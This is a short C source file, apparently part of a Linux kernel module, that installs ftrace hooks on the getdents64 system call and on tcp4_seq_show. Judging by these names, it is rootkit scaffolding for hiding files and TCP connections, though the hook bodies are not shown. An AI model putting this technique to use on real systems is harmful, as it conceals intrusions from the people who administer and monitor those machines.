#include "ftrace.h"

#include "hooks/hook_getdents64.h"
#include "hooks/hook_tcp4_seq_show.h"

static struct ftrace_hook hooks[] = {
    {"__x64_sys_getdents64", hook_getdents64, &getdents64},
    {"tcp4_seq_show", hook_tcp4_seq_show, &tcp4_seq_show}};

int install_hooks(void)
{
    int hook_count = ARRAY_SIZE(hooks);
    int err;

    for (int i = 0; i < hook_count; i++)
    {
        err = fh_install_hook(&hooks[i]);

        if (err)
        {
            while (i > 0)
                fh_remove_hook(&hooks[--i]);

            return err;
        }
    }

    return 0;
}

void uninstall_hooks(void)
{
    int hook_count = ARRAY_SIZE(hooks);

    for (int i = 0; i < hook_count; i++)
        fh_remove_hook(&hooks[i]);
}